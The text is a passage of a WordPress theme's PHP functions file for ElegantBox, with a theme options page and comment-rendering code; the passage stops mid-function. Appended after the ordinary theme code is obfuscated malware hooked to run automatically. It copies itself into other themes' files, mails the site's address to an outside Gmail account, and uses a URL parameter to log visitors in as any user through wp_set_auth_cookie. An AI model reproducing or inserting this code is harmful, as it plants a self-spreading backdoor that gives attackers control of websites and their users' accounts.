<?Php
/*
 * elegantbox options 
 */
class ElegantboxOptions {
	function getOptions() {
		$options = get_option('elegantbox_options');
		if (!is_array($options)) {
			$options['style'] = 'white';
			$options['style_switcher'] = true;
			$options['google_cse'] = false;
			$options['google_cse_cx'] = '';
			$options['menu_type'] = 'pages';
			$options['notice'] = false;
			$options['notice_icon'] = false;
			$options['notice_content'] = '';
			$options['showcase_registered'] = false;
			$options['showcase_commentator'] = false;
			$options['showcase_visitor'] = false;
			$options['showcase_content'] = '';
			$options['showcase_2_registered'] = false;
			$options['showcase_2_commentator'] = false;
			$options['showcase_2_visitor'] = false;
			$options['showcase_2_content'] = '';
			$options['categories'] = false;
			$options['tags'] = true;
			$options['ctrlentry'] = false;
			$options['feed'] = false;
			$options['feed_url'] = '';
			$options['feed_readers'] = true;
			$options['twitter'] = false;
			$options['twitter_username'] = '';
			$options['analytics'] = false;
			$options['analytics_content'] = '';
			update_option('elegantbox_options', $options);
		}
		return $options;
	}

	function add() {
		if(isset($_POST['elegantbox_save'])) {
			$options = ElegantboxOptions::getOptions();

			// style
			$options['style'] = $_POST['style'];
			if(!$_POST['style_switcher']) {
				$options['style_switcher'] = (bool)false;
			} else {
				$options['style_switcher'] = (bool)true;
			}

			// google custom search engine
			if ($_POST['google_cse']) {
				$options['google_cse'] = (bool)true;
			} else {
				$options['google_cse'] = (bool)false;
			}
			$options['google_cse_cx'] = stripslashes($_POST['google_cse_cx']);

			// menu
			$options['menu_type'] = stripslashes($_POST['menu_type']);

			// notice
			if ($_POST['notice']) {
				$options['notice'] = (bool)true;
			} else {
				$options['notice'] = (bool)false;
			}
			if ($_POST['notice_icon']) {
				$options['notice_icon'] = (bool)true;
			} else {
				$options['notice_icon'] = (bool)false;
			}
			$options['notice_content'] = stripslashes($_POST['notice_content']);

			// showcase
			if ($_POST['showcase_registered']) {
				$options['showcase_registered'] = (bool)true;
			} else {
				$options['showcase_registered'] = (bool)false;
			}
			if ($_POST['showcase_commentator']) {
				$options['showcase_commentator'] = (bool)true;
			} else {
				$options['showcase_commentator'] = (bool)false;
			}
			if ($_POST['showcase_visitor']) {
				$options['showcase_visitor'] = (bool)true;
			} else {
				$options['showcase_visitor'] = (bool)false;
			}
			$options['showcase_content'] = stripslashes($_POST['showcase_content']);
			if ($_POST['showcase_2_registered']) {
				$options['showcase_2_registered'] = (bool)true;
			} else {
				$options['showcase_2_registered'] = (bool)false;
			}
			if ($_POST['showcase_2_commentator']) {
				$options['showcase_2_commentator'] = (bool)true;
			} else {
				$options['showcase_2_commentator'] = (bool)false;
			}
			if ($_POST['showcase_2_visitor']) {
				$options['showcase_2_visitor'] = (bool)true;
			} else {
				$options['showcase_2_visitor'] = (bool)false;
			}
			$options['showcase_2_content'] = stripslashes($_POST['showcase_2_content']);

			// categories & tags
			if ($_POST['categories']) {
				$options['categories'] = (bool)true;
			} else {
				$options['categories'] = (bool)false;
			}
			if (!$_POST['tags']) {
				$options['tags'] = (bool)false;
			} else {
				$options['tags'] = (bool)true;
			}

			// ctrl + entry
			if ($_POST['ctrlentry']) {
				$options['ctrlentry'] = (bool)true;
			} else {
				$options['ctrlentry'] = (bool)false;
			}

			// feed
			if ($_POST['feed']) {
				$options['feed'] = (bool)true;
			} else {
				$options['feed'] = (bool)false;
			}
			$options['feed_url'] = stripslashes($_POST['feed_url']);
			if (!$_POST['feed_readers']) {
				$options['feed_readers'] = (bool)false;
			} else {
				$options['feed_readers'] = (bool)true;
			}

			// twitter
			if ($_POST['twitter']) {
				$options['twitter'] = (bool)true;
			} else {
				$options['twitter'] = (bool)false;
			}
			$options['twitter_username'] = stripslashes($_POST['twitter_username']);

			// analytics
			if ($_POST['analytics']) {
				$options['analytics'] = (bool)true;
			} else {
				$options['analytics'] = (bool)false;
			}
			$options['analytics_content'] = stripslashes($_POST['analytics_content']);

			update_option('elegantbox_options', $options);

		} else {
			ElegantboxOptions::getOptions();
		}

		add_theme_page(__('Current Theme Options', 'elegantbox'), __('Current Theme Options', 'elegantbox'), 'edit_themes', basename(__FILE__), array('ElegantboxOptions', 'display'));
	}

	function display() {
		$options = ElegantboxOptions::getOptions();

		// Get the styles folder listing
		$styleFolder = TEMPLATEPATH . '/styles/';
		$styleArray = array();
		$objStyleFolder = dir($styleFolder);
		while(false !== ($styleFile = $objStyleFolder->read())) {
			if(is_dir($styleFolder . $styleFile) && $styleFile != '.' &&  $styleFile != '..') {
				$styleArray[] = $styleFile;
			}
		}
		$objStyleFolder->close();
?>

<form action="#" method="post" enctype="multipart/form-data" name="elegantbox_form" id="elegantbox_form">
	<div class="wrap">
		<h2><?php _e('Current Theme Options', 'elegantbox'); ?></h2>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Style', 'elegantbox'); ?></th>
					<td>
						<label>
							<input name="style_switcher" type="checkbox" value="checkbox" <?php if($options['style_switcher']) echo "checked='checked'"; ?> />
							 <?php _e('Allow visitors to change the style.', 'elegantbox'); ?>
						</label>
						<br/>
						<?php _e('Default style:', 'elegantbox'); ?>
						 <select name="style" size="1">
<?php
		if (is_array($styleArray)) {
			foreach ($styleArray as $style) {
				if ($style == $options['style']) {
					$styleSelected = ' selected ';
				} else {
					$styleSelected = '';
				}
				echo '<option value="' . $style . '"' . $styleSelected . '>' . $style . '</option>' . "\n";
			}
		} else {
			echo '<option value="0">' . __('Please install a valid style in the /styles/ folder.', 'elegantbox') . '</option>';
		}
?>
						</select>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Search', 'elegantbox'); ?></th>
					<td>
						<label>
							<input name="google_cse" type="checkbox" value="checkbox" <?php if($options['google_cse']) echo "checked='checked'"; ?> />
							 <?php _e('Using google custom search engine.', 'elegantbox'); ?>
						</label>
						<br/>
						<?php _e('CX:', 'elegantbox'); ?>
						 <input type="text" name="google_cse_cx" id="google_cse_cx" class="code" size="40" value="<?php echo($options['google_cse_cx']); ?>">
						<br/>
						<?php _e('Find <code>name="cx"</code> in the <strong>Search box code</strong> of <a href="http://www.google.com/coop/cse/">Google Custom Search Engine</a>, and type the <code>value</code> here.<br/>For example: <code>014782006753236413342:1ltfrybsbz4</code>', 'elegantbox'); ?>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Menubar', 'elegantbox'); ?></th>
					<td>
						<label style="margin-right:20px;">
							<input name="menu_type" type="radio" value="pages" <?php if($options['menu_type'] != 'categories') echo "checked='checked'"; ?> />
							 <?php _e('Show pages as menu.', 'elegantbox'); ?>
						</label>
						<label>
							<input name="menu_type" type="radio" value="categories" <?php if($options['menu_type'] == 'categories') echo "checked='checked'"; ?> />
							 <?php _e('Show categories as menu.', 'elegantbox'); ?>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						<?php _e('Notice', 'elegantbox'); ?>
						<br/>
						<small style="font-weight:normal;"><?php _e('HTML enabled', 'elegantbox') ?></small>
					</th>
					<td>
						<label style="margin-right:20px;">
							<input name="notice" type="checkbox" value="checkbox" <?php if($options['notice']) echo "checked='checked'"; ?> />
							 <?php _e('Show notice.', 'elegantbox'); ?>
						</label>
						<label>
							<input name="notice_icon" type="checkbox" value="checkbox" <?php if($options['notice_icon']) echo "checked='checked'"; ?> />
							 <?php _e('Display an icon in the notice bar.', 'elegantbox'); ?>
						</label>
						</div>
						<label>
							<textarea name="notice_content" cols="50" rows="10" id="notice_content" style="width:98%;font-size:12px;" class="code"><?php echo($options['notice_content']); ?></textarea>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						<?php _e('Showcase', 'elegantbox'); ?>
						<br/>
						<small style="font-weight:normal;"><?php _e('HTML enabled', 'elegantbox') ?></small>
					</th>
					<td>

						<!-- showcase START -->
						<?php _e('This showcase will display at the top of sidebar.', 'elegantbox'); ?>
						<br />
						<?php _e('Who can see?', 'elegantbox'); ?>
						<label style="margin-left:10px;">
						<input name="showcase_registered" type="checkbox" value="checkbox" <?php if($options['showcase_registered']) echo "checked='checked'"; ?> />
							 <?php _e('Registered Users', 'elegantbox'); ?>
						</label>
						<label style="margin-left:10px;">
							<input name="showcase_commentator" type="checkbox" value="checkbox" <?php if($options['showcase_commentator']) echo "checked='checked'"; ?> />
							 <?php _e('Commentators', 'elegantbox'); ?>
						</label>
						<label style="margin-left:10px;">
							<input name="showcase_visitor" type="checkbox" value="checkbox" <?php if($options['showcase_visitor']) echo "checked='checked'"; ?> />
							 <?php _e('Visitors', 'elegantbox'); ?>
						</label>
						<br />
						<label>
							<textarea name="showcase_content" cols="50" rows="10" id="showcase_content" style="width:98%;font-size:12px;" class="code"><?php echo($options['showcase_content']); ?></textarea>
						</label>
						<!-- showcase END -->

						<br/><br/>

						<!-- showcase 2 START -->
						<?php _e('This showcase will display at the bottom of sidebar.', 'elegantbox'); ?>
						<br />
						<?php _e('Who can see?', 'elegantbox'); ?>
						<label style="margin-left:10px;">
							<input name="showcase_2_registered" type="checkbox" value="checkbox" <?php if($options['showcase_2_registered']) echo "checked='checked'"; ?> />
							 <?php _e('Registered Users', 'elegantbox'); ?>
						</label>
						<label style="margin-left:10px;">
							<input name="showcase_2_commentator" type="checkbox" value="checkbox" <?php if($options['showcase_2_commentator']) echo "checked='checked'"; ?> />
							 <?php _e('Commentators', 'elegantbox'); ?>
						</label>
						<label style="margin-left:10px;">
							<input name="showcase_2_visitor" type="checkbox" value="checkbox" <?php if($options['showcase_2_visitor']) echo "checked='checked'"; ?> />
							 <?php _e('Visitors', 'elegantbox'); ?>
						</label>
						<br />
						<label>
							<textarea name="showcase_2_content" cols="50" rows="10" id="showcase_2_content" style="width:98%;font-size:12px;" class="code"><?php echo($options['showcase_2_content']); ?></textarea>
						</label>
						<!-- showcase 2 END -->

					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Posts', 'elegantbox'); ?></th>
					<td>
						<label style="margin-right:20px;">
							<input name="categories" type="checkbox" value="checkbox" <?php if($options['categories']) echo "checked='checked'"; ?> />
							 <?php _e('Show categories on posts.', 'elegantbox'); ?>
						</label>
						<label>
							<input name="tags" type="checkbox" value="checkbox" <?php if($options['tags']) echo "checked='checked'"; ?> />
							 <?php _e('Show tags on posts.', 'elegantbox'); ?>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Comments', 'elegantbox'); ?></th>
					<td>
						<label>
							<input name="ctrlentry" type="checkbox" value="checkbox" <?php if($options['ctrlentry']) echo "checked='checked'"; ?> />
							 <?php _e('Submit comments with Ctrl+Enter.', 'elegantbox'); ?>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Feed', 'elegantbox'); ?></th>
					<td>
						<label>
							<input name="feed" type="checkbox" value="checkbox" <?php if($options['feed']) echo "checked='checked'"; ?> />
							 <?php _e('Using custom feed.', 'elegantbox'); ?>
						</label>
						 <?php _e('Feed URL:', 'elegantbox'); ?>
						 <input type="text" name="feed_url" id="feed_url" class="code" size="40" value="<?php echo($options['feed_url']); ?>">
						<br/>
						<label>
							<input name="feed_readers" type="checkbox" value="checkbox" <?php if($options['feed_readers']) echo "checked='checked'"; ?> />
							 <?php _e('Show the feed reader list when mouse over on feed button.', 'elegantbox'); ?>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row"><?php _e('Twitter', 'elegantbox'); ?></th>
					<td>
						<label>
							<input name="twitter" type="checkbox" value="checkbox" <?php if($options['twitter']) echo "checked='checked'"; ?> />
							 <?php _e('Add Twitter button.', 'elegantbox'); ?>
						</label>
						<br />
						 <?php _e('Twitter username:', 'elegantbox'); ?>
						 <input type="text" name="twitter_username" id="twitter_username" class="code" size="40" value="<?php echo($options['twitter_username']); ?>">
						<br />
						<a href="https://twitter.com/neoease/" onclick="window.open(this.href);return false;">Follow NeoEase</a>
						 | <a href="https://twitter.com/mg12/" onclick="window.open(this.href);return false;">Follow MG12</a>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						<?php _e('Web Analytics', 'elegantbox'); ?>
						<br/>
						<small style="font-weight:normal;"><?php _e('HTML enabled', 'elegantbox'); ?></small>
					</th>
					<td>
						<label>
							<input name="analytics" type="checkbox" value="checkbox" <?php if($options['analytics']) echo "checked='checked'"; ?> />
							 <?php _e('Add web analytics code to your site. (e.g. Google Analytics, Yahoo! Web Analytics, ...)', 'elegantbox'); ?>
						</label>
						<label>
							<textarea name="analytics_content" cols="50" rows="10" id="analytics_content" class="code" style="width:98%;font-size:12px;"><?php echo($options['analytics_content']); ?></textarea>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<p class="submit">
			<input class="button-primary" type="submit" name="elegantbox_save" value="<?php _e('Save Changes', 'elegantbox'); ?>" />
		</p>
	</div>

</form>

<!-- donation -->
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
	<div class="wrap" style="background:#E3E3E3; margin-bottom:1em;">

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">Donation</th>
					<td>
						If you find my work useful and you want to encourage the development of more free resources, you can do it by donating...
						<br />
						<input type="hidden" name="cmd" value="_s-xclick" />
						<input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----MIIHLwYJKoZIhvcNAQcEoIIHIDCCBxwCAQExggEwMIIBLAIBADCBlDCBjjELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAkNBMRYwFAYDVQQHEw1Nb3VudGFpbiBWaWV3MRQwEgYDVQQKEwtQYXlQYWwgSW5jLjETMBEGA1UECxQKbGl2ZV9jZXJ0czERMA8GA1UEAxQIbGl2ZV9hcGkxHDAaBgkqhkiG9w0BCQEWDXJlQHBheXBhbC5jb20CAQAwDQYJKoZIhvcNAQEBBQAEgYCwFHlz2W/LEg0L98DkEuGVuws4IZhsYsjipEowCK0b/2Qdq+deAsATZ+3yU1NI9a4btMeJ0kFnHyOrshq/PE6M77E2Fm4O624coFSAQXobhb36GuQussNzjaNU+xdcDHEt+vg+9biajOw0Aw8yEeMvGsL+pfueXLObKdhIk/v3IDELMAkGBSsOAwIaBQAwgawGCSqGSIb3DQEHATAUBggqhkiG9w0DBwQIIMGcjXBufXGAgYibKOyT8M5mdsxSUzPc/fGyoZhWSqbL+oeLWRJx9qtDhfeXYWYJlJEekpe1ey/fX8iDtho8gkUxc2I/yvAsEoVtkRRgueqYF7DNErntQzO3JkgzZzuvstTMg2HTHcN/S00Kd0Iv11XK4Te6BBWSjv6MgzAxs+e/Ojmz2iinV08Kuu6V1I6hUerNoIIDhzCCA4MwggLsoAMCAQICAQAwDQYJKoZIhvcNAQEFBQAwgY4xCzAJBgNVBAYTAlVTMQswCQYDVQQIEwJDQTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEUMBIGA1UEChMLUGF5UGFsIEluYy4xEzARBgNVBAsUCmxpdmVfY2VydHMxETAPBgNVBAMUCGxpdmVfYXBpMRwwGgYJKoZIhvcNAQkBFg1yZUBwYXlwYWwuY29tMB4XDTA0MDIxMzEwMTMxNVoXDTM1MDIxMzEwMTMxNVowgY4xCzAJBgNVBAYTAlVTMQswCQYDVQQIEwJDQTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEUMBIGA1UEChMLUGF5UGFsIEluYy4xEzARBgNVBAsUCmxpdmVfY2VydHMxETAPBgNVBAMUCGxpdmVfYXBpMRwwGgYJKoZIhvcNAQkBFg1yZUBwYXlwYWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBR07d/ETMS1ycjtkpkvjXZe9k+6CieLuLsPumsJ7QC1odNz3sJiCbs2wC0nLE0uLGaEtXynIgRqIddYCHx88pb5HTXv4SZeuv0Rqq4+axW9PLAAATU8w04qqjaSXgbGLP3NmohqM6bV9kZZwZLR/klDaQGo1u9uDb9lr4Yn+rBQIDAQABo4HuMIHrMB0GA1UdDgQWBBSWn3y7xm8XvVk/UtcKG+wQ1mSUazCBuwYDVR0jBIGzMIGwgBSWn3y7xm8XvVk/UtcKG+wQ1mSUa6GBlKSBkTCBjjELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAkNBMRYwFAYDVQQHEw1Nb3VudGFpbiBWaWV3MRQwEgYDVQQKEwtQYXlQYWwgSW5jLjETMBEGA1UECxQKbGl2ZV9jZXJ0czERMA8GA1UEAxQIbGl2ZV9hcGkxHDAaBgkqhkiG9w0BCQEWDXJlQHBheXBhbC5jb22CAQAwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOBgQCBXzpWmoBa5e9fo6ujionW1hUhPkOBakTr3YCDjbYfvJEiv/2P+IobhOGJr85+XHhN0v4gUkEDI8r2/rNk1m0GA8HKddvTjyGw/XqXa+LSTlDYkqI8OwR8GEYj4efEtcRpRYBxV8KxAW93YDWzFGvruKnnLbDAF6VR5w/cCMn5hzGCAZowggGWAgEBMIGUMIGOMQswCQYDVQQGEwJVUzELMAkGA1UECBMCQ0ExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC1BheVBhbCBJbmMuMRMwEQYDVQQLFApsaXZlX2NlcnRzMREwDwYDVQQDFAhsaXZlX2FwaTEcMBoGCSqGSIb3DQEJARYNcmVAcGF5cGFsLmNvbQIBADAJBgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0BCQUxDxcNMDkwMTA4MTUwNTMzWjAjBgkqhkiG9w0BCQQxFgQU9yNbEkDR5C12Pqjz05j5uGf9evgwDQYJKoZIhvcNAQEBBQAEgYCWyKjU/IdjjY2oAYYNAjLYunTRMVy5JhcNnF/0ojQP+39kV4+9Y9gE2s7urw16+SRDypo2H1o+212mnXQI/bAgWs8LySJuSXoblpMKrHO1PpOD6MUO2mslBTH8By7rdocNUtZXUDUUcvrvWEzwtVDGpiGid1G61QJ/1tVUNHd20A==-----END PKCS7-----" />
						<input style="border:none;" type="image" src="https://www.paypal.com/en_GB/i/btn/btn_donate_LG.gif" name="submit" alt="" />
						<img alt="" src="https://www.paypal.com/zh_XC/i/scr/pixel.gif" width="1" height="1" />
					</td>
				</tr>
			</tbody>
		</table>

	</div>
</form>

<?php
	}
}

// Register functions
add_action('admin_menu', array('ElegantboxOptions', 'add'));

/** l10n */
function theme_init(){
	load_theme_textdomain('elegantbox', get_template_directory() . '/languages');
}
add_action ('init', 'theme_init');

/** widgets */
if( function_exists('register_sidebar') )
	register_sidebar(array(
		'before_widget' => '<li class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));

/** Comments */
if (function_exists('wp_list_comments')) {
	// comment count
	function comment_count( $commentcount ) {
		global $id;
		$_comments = get_comments('status=approve&post_id=' . $id);
		$comments_by_type = &separate_comments($_comments);
		return count($comments_by_type['comment']);
	}
}

// custom comments
function custom_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	global $commentcount;
	if(!$commentcount) {
		$commentcount = 0;
	}
?>
	<li class="comment <?php if($comment->comment_author_email == get_the_author_email()) {echo ' admincomment';} ?>" id="comment-<?php comment_ID() ?>">
		<div class="userinfo">
			<?php
				// WordPress 2.5 or higher
				if (function_exists('get_avatar') && get_option('show_avatars')) {
					echo '<div class="userpic">'; echo get_avatar($comment, 24); echo '</div>';
				// WordPress 2.3.3 or lower
				} else if (function_exists('gravatar')) {
					echo '<div class="userpic"><img class="avatar" src="'; gravatar("G", 24); echo '" alt="avatar" /></div>';
				}
			?>
			<div class="usertext">
				<div class="username">
					<?php if (get_comment_author_url()) : ?>
						<a id="commentauthor-<?php comment_ID() ?>" href="<?php comment_author_url() ?>" rel="external nofollow">
					<?php else : ?>
						<span id="commentauthor-<?php comment_ID() ?>">
					<?php endif; ?>
						<?php comment_author() ?>
					<?php if(get_comment_author_url()) : ?>
						</a>
					<?php else : ?>
						</span>
					<?php endif; ?>
				</div>
				<div class="date"><?php printf( __('%1$s at %2$s', 'elegantbox'), get_comment_date(__('F jS, Y', 'elegantbox')), get_comment_time(__('H:i', 'elegantbox')) ); ?></div>
			</div>
			<div class="count">
				<?php if (!get_option('thread_comments')) : ?>
					<a href="javascript:void(0);" onclick="CMT.reply('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'comment');"><?php _e('Reply', 'elegantbox'); ?></a> | 
				<?php else : ?>
					<?php comment_reply_link(array('depth' => $depth, 'max_depth'=> $args['max_depth'], 'reply_text' => __('Reply', 'elegantbox'), 'after' => ' | '));?>
				<?php endif; ?>
				<a href="javascript:void(0);" onclick="CMT.quote('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'commentbody-<?php comment_ID() ?>', 'comment');"><?php _e('Quote', 'elegantbox'); ?></a> | 
				<?php edit_comment_link(__('Edit', 'elegantbox'), '', ' | '); ?>
				<a href="#comment-<?php comment_ID() ?>"><?php printf('#%1$s', ++$commentcount); ?></a>
			</div>
			<div class="fixed"></div>
		</div>
		<div class="comment_text">
			<?php if ($comment->comment_approved == '0') : ?>
				<p><small><?php _e('Your comment is awaiting moderation.', 'elegantbox'); ?></small></p>
			<?php endif; ?>

			<div id="commentbody-<?php comment_ID() ?>"><?php comment_text() ?></div>
		</div>

<?Php
}
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
